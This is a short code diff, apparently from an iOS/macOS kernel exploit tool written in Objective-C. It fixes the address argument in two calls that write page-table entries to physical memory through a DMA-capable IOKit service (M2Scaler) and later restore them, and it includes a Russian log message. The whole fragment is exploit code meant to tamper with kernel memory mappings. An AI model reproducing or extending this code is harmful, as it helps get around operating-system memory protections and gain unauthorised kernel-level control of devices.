@@ -2991,7 +2991,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                 memset(tsd2, 0, sizeof(tsd2));
                                 *(uint32_t *)(tsd2 + 0x0C) = 32;
                                 *(uint32_t *)(tsd2 + 0x10) = 32;
-                                dmaOK = kpPhysWrite8v2(svc2, tsd2, ttM2, isTable2, ptePage, pteOff, newPte, r);
+                                dmaOK = kpPhysWrite8v2(svc2, tsd2, ttM2, isTable2, ptePA, pteOff, newPte, r);
                                 IOObjectRelease(svc2);
                             } else {
                                 kpNote(r, @"  [PTE] M2Scaler не найден");
@@ -3030,7 +3030,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     if (svc3) {
                                         uint8_t tsd3[0x1B0]; memset(tsd3, 0, sizeof(tsd3));
                                         *(uint32_t *)(tsd3 + 0x0C) = 32; *(uint32_t *)(tsd3 + 0x10) = 32;
-                                        kpPhysWrite8v2(svc3, tsd3, ttM2, isTable2, ptePage, pteOff, pteSave, r);
+                                        kpPhysWrite8v2(svc3, tsd3, ttM2, isTable2, ptePA, pteOff, pteSave, r);
                                         IOObjectRelease(svc3);
                                     }
                                 }
